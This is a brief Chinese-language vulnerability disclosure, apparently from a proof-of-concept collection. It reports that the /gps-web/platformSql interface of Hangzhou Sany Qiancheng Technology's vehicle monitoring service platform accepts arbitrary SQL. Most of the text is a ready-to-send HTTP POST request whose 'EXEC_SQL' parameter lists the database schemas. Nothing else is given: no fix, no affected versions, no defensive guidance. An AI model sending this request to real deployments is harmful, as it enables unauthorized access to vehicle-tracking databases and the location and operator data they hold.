# 杭州三一谦成科技车辆监控服务平台接口platformSql存在SQL注入漏洞

杭州三一谦成科技车辆监控服务平台接口 /gps-web/platformSql 存在SQL 注入漏洞



## poc

```java
POST /gps-web/platformSql HTTP/1.1
Host:
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */* Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=EXEC_SQL&params=SELECT schema_name FROM information_schema.schemata
```

